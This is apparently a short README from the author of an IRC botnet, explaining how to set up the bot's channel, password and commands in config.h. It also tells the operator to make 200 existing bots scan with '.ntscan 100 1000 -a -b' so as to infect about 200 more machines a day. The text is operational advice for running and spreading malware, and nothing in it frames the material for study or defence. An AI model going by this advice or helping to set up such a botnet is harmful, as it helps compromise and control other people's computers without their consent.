                                 ===================================

           
           The only thing you have to doe to config it good is changing your #channel
           to the one you want, changing the password and all the rest to what you want.

           Do not edit the main.cpp i already fixed it for you so you dont have to edit
           again because if you change stuff maybe it wont work as well.

           You can also change the command in the config.h " if i was you i would change them
           to prevent not to get your botnet stolen".


          What i usaly doe is Start with 200bots and make them scan with .ntscan 100 1000 -a -b
          If you start with 200 you'll get probably around 200 each day.
